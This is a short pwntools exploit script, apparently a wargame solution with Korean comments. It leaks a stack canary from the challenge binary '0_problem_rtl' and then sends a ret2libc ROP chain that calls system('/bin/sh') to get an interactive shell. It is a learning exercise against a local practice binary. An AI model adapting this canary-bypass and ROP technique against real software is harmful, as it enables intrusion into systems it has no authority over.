#!/usr/bin/env python3
# Name: 1_exploit.py
from pwn import *
p = process('./0_problem_rtl')
e = ELF('./0_problem_rtl')
def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak canary
buf = b'A' * 0x39                           # buf 크기(0x30) + "\x00" = 0x39
p.sendafter(b'Buf: ', buf)                  # buf에 입력한 값 확인
p.recvuntil(buf)                            # 입력받은 값과 "\x00"으로 카나리값 확인
cnry = u64(b'\x00' + p.recvn(7))            # 카나리의 첫바이트는NULL + 랜덤한 7바이트(x64)
slog('canary', cnry)

# [2] Exploit
system_plt = e.plt['system']                # PLT에 있는 system 함수 주소
binsh = 0x400874                            # [pwndbg> search /bin/sh]으로 '/bin/sh' 스트링 주소 확인
pop_rdi = 0x0000000000400853                # [ROPgadget --binary ./rtl --re "pop rdi"]으로 'pop rdi ; ret'의 리턴 가젯 확인
ret = 0x0000000000400285                    # RBP는 변조되었기 때문에 실행되지 않아 프로그램 실행에 영향주지 않음

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8  # buf(x38) + canary('\x00' + Random 7Bytes) + SFP
payload += p64(ret)                         # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
pause()
p.sendafter(b'Buf: ', payload)
p.interactive()
